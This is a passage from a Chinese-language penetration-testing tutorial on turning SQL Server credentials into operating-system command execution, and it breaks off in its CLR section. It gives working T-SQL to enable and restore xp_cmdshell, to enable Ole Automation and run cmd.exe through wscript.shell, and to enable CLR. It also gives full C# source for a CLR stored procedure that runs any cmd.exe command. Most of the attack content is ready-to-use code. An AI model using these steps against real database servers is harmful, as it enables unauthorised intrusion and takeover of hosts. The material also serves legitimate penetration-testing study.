## 0x00 简介
本文的攻击场景如下：
演示环境的利用场景：
本文将要介绍以下内容：
  * xp_cmdshell利用
  * COM组件利用
  * CLR利用
  * SQL Server 2016 R利用
  * SQL Server 2017 Python利用
  * 沙盒利用(openrowset)
  * Agent Job利用
## 0x01 xp_cmdshell利用
前提条件：
  * Mssql数据库服务未降权
  * 已获取到数据库密码
xp_cmdshell是Sql Server中的一个组件，我们可以用它来执行系统命令。
### 判断xp_cmdshell状态
我们可以在master.dbo.sysobjects中查看xp_cmdshell状态
    select * from master.dbo.sysobjects where xtype='x' and name='xp_cmdshell'
xtype为对象类型，xtype='x'这里表示xp_cmdshell的对象类型为扩展存储过程。
只用判断存在，利用count(*)即可。
    select count(*) from master.dbo.sysobjects where xtype='x' and name='xp_cmdshell'
存在即返回1
### 启用xp_cmdshell
我们可以利用EXEC启用xp_cmdshell
    EXEC sp_configure 'show advanced options', 1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell', 1;RECONFIGURE;
### 利用xp_cmdshell执行命令
通过xp_cmdshell执行系统命令指令如下
    exec master..xp_cmdshell 'whoami'
### 恢复被删除的xp_cmdshell
我们可以利用xplog70.dll恢复被删除的xp_cmdshell
    Exec master.dbo.sp_addextendedproc 'xp_cmdshell','D:\\xplog70.dll'
## 0x02 COM组件利用
前提条件：
  * Mssql数据库服务未降权
  * 已获取到数据库密码
我们可以借助Sql Server中的COM组件SP_OACREATE来执行系统命令。
### 判断SP_OACREATE状态
我们可以在master.dbo.sysobjects中查看SP_OACREATE状态
    select * from master.dbo.sysobjects where xtype='x' and name='SP_OACREATE'
只用判断存在，利用count(*)即可。
    select count(*) from master.dbo.sysobjects where xtype='x' and name='SP_OACREATE'
存在即返回1
### 启用SP_OACREATE
利用EXEC启用SP_OACREATE
    EXEC sp_configure 'show advanced options', 1;   
    RECONFIGURE WITH OVERRIDE;   
    EXEC sp_configure 'Ole Automation Procedures', 1;   
    RECONFIGURE WITH OVERRIDE;
### 利用SP_OACREATE执行命令
通过SP_OACREATE执行系统命令指令如下
    declare @shell int exec sp_oacreate 'wscript.shell',@shell output exec sp_oamethod @shell,'run',null,'c:\windows\system32\cmd.exe /c whoami >c:\\1.txt'
此利用方法无回显
## 0x03 CLR利用
### 什么是CLR
CLR微软官方把他称为公共语言运行时，从 SQL Server 2005 (9.x) 开始，SQL Server 集成了用于 Microsoft
Windows 的 .NET Framework 的公共语言运行时 (CLR) 组件。 这意味着现在可以使用任何 .NET Framework 语言（包括
Microsoft Visual Basic .NET 和 Microsoft Visual
C#）来编写存储过程、触发器、用户定义类型、用户定义函数、用户定义聚合和流式表值函数。
更多概念详见下方官方链接：
### 编写CLR
利用VS创建MSSQL数据库项目
修改目标平台和勾选创建脚本
修改目标框架和权限级别
创建SQL CLR C# 存储过程
写入代码
    using System;
    using System.Data;
    using System.Data.SqlClient;
    using System.Data.SqlTypes;
    using System.Diagnostics;
    using System.Text;
    using Microsoft.SqlServer.Server;
    public partial class StoredProcedures
    {
        [Microsoft.SqlServer.Server.SqlProcedure]
        public static void ExecCommand (string cmd)
        {
            // 在此处放置代码
            SqlContext.Pipe.Send("Command is running, please wait.");
            SqlContext.Pipe.Send(RunCommand("cmd.exe", " /c " + cmd));
        }
        public static string RunCommand(string filename,string arguments)
        {
            var process = new Process();
            process.StartInfo.FileName = filename;
            if (!string.IsNullOrEmpty(arguments))
            {
                process.StartInfo.Arguments = arguments;
            }
            process.StartInfo.CreateNoWindow = true;
            process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
            process.StartInfo.UseShellExecute = false;
            process.StartInfo.RedirectStandardError = true;
            process.StartInfo.RedirectStandardOutput = true;
            var stdOutput = new StringBuilder();
            process.OutputDataReceived += (sender, args) => stdOutput.AppendLine(args.Data);
            string stdError = null;
            try
            {
                process.Start();
                process.BeginOutputReadLine();
                stdError = process.StandardError.ReadToEnd();
                process.WaitForExit();
            }
            catch (Exception e)
            {
                SqlContext.Pipe.Send(e.Message);
            }
            if (process.ExitCode == 0)
            {
                SqlContext.Pipe.Send(stdOutput.ToString());
            }
            else
            {
                var message = new StringBuilder();
                if (!string.IsNullOrEmpty(stdError))
                {
                    message.AppendLine(stdError);
                }
                if (stdOutput.Length != 0)
                {
                    message.AppendLine("Std output:");
                    message.AppendLine(stdOutput.ToString());
                }
                SqlContext.Pipe.Send(filename + arguments + " finished with exit code = " + process.ExitCode + ": " + message);
            }
            return stdOutput.ToString();
        }
    }
### 启用MSSQL CLR功能
MSSQL CLR功能默认关闭，利用以下语句启用。
    sp_configure 'clr enabled', 1